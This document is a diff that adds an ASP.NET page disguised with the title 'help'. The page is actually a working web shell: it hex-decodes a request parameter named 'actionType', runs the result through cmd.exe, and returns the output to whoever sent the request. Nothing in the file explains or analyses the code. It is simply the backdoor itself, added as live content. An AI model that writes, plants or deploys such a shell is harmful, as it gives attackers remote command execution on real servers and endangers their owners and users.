@@ -1,0 +1,52 @@
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Net" %>
+<script Language="c#" runat="server">
+public string ConvertHexToString(string HexValue)
+{
+    string StrValue = "";
+    while (HexValue.Length > 0)
+    {
+        StrValue += System.Convert.ToChar(System.Convert.ToUInt32(HexValue.Substring(0, 2), 16)).ToString();
+        HexValue = HexValue.Substring(2, HexValue.Length - 2);
+    }
+    return StrValue;
+}
+</script>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+<title>help</title>
+
+</head>
+<body>
+<%
+
+string actionType=Request.Params["actionType"];
+try{
+actionType=ConvertHexToString(actionType);     
+        Process p = new Process();
+		p.StartInfo.FileName = "cmd.exe";
+		p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardInput = true;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.RedirectStandardError = true;
+        p.StartInfo.CreateNoWindow = true;
+        p.Start();
+        p.StandardInput.WriteLine(actionType+"&exit");
+        p.StandardInput.AutoFlush=true;
+        string strOuput = p.StandardOutput.ReadToEnd();
+        p.WaitForExit();
+        p.Close();
+        Response.Write(strOuput);
+}
+catch{
+ Response.Write("param is wrong.<br>");
+ return;
+}
+
+
+%>
+</body>
+</html>
